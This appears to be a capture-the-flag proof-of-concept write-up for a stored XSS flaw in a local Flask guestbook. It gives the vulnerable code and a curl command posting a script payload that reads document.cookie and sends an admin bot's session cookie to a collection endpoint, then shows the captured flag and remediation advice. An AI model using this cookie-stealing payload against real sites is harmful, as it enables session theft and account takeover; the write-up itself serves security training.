# PoC 3 — Stored XSS (guestbook → admin cookie theft)

**Flag:** `FLAG{xss_2a904a23f36b}`

## Vulnerability

`/guestbook` stores whatever a visitor submits in `comment` and renders
it back to every visitor, including a simulated "admin" bot, without
escaping:

```python
db.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))
...
# VULN (xss): comment bodies are rendered without escaping (see template).
return render_template("guestbook.html", user=user, rows=rows)
```

The admin bot periodically reads new comments; if one contains a
`<script>` that touches `document.cookie`, the bot executes it with the
admin's session attached and follows any exfiltration request inside it.

## Exploit

Posted a guestbook comment containing a script that reads the victim's
cookie and sends it to `/grab`, an attacker-controlled-looking endpoint:

```bash
curl -s -i -X POST http://127.0.0.1:5000/guestbook \
  --data-urlencode "comment=<script>fetch('/grab?c='+document.cookie)</script>"
```

This is stored verbatim in the `comments` table and re-rendered unescaped
to every visitor of `/guestbook`, including the admin bot. When the bot's
simulated browser renders the page, it executes the script, which fetches
`/grab` with the admin's cookie appended to the query string. Checking the
collection endpoint:

```bash
curl -s http://127.0.0.1:5000/grab
```

**Response (excerpt):**

```html
<h1>Collected data</h1>
<ul>
  <li><code>c=session=admin; flag=FLAG{xss_2a904a23f36b}</code></li>
</ul>
```

The attacker-controlled script, running in the admin's session, exfiltrated
the admin's cookie (containing the flag) to the attacker's collection
endpoint — a textbook stored-XSS cookie theft.

## Remediation

Escape all user-controlled content before rendering (Jinja2 autoescapes
by default — this app explicitly opts out or marks the field `|safe`
somewhere in `guestbook.html`; removing that is the fix), and set the
session cookie `HttpOnly` so `document.cookie` cannot read it even if a
script does execute. A Content-Security-Policy header blocking inline
`<script>` would also mitigate this class of bug.

**Severity:** Critical — arbitrary JavaScript execution in an admin's
session, enabling session/cookie theft and full account takeover.
